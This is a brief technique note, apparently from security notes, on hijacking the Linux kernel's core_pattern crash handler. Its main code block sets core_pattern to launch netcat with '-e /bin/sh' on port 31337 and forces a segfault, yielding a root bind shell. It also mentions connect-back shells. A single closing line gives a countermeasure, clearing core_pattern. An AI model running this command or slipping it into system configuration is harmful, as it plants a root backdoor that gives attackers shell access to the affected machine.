# Core Pattern

You can give the kernel a crash handler which will be executed if a segfault happens. Ubuntu uses that to launch [apport](https://wiki.ubuntu.com/Apport) and you can hijack this feature to have your rootshell executed:

```
  echo '|/bin/nc.traditional -l -p 31337 -e /bin/sh' | sudo tee /proc/sys/kernel/core_pattern
   gedit & kill -SEGV %%
```

You can now connect to localhost 31337 to have a rootshell. Of course you could launch connect back shells or any other malicious program.

To counter this threat, you might want to read this core\_pattern file or in doubt erase the signal handler:

```
 echo '' | sudo tee /proc/sys/kernel/core_pattern
```
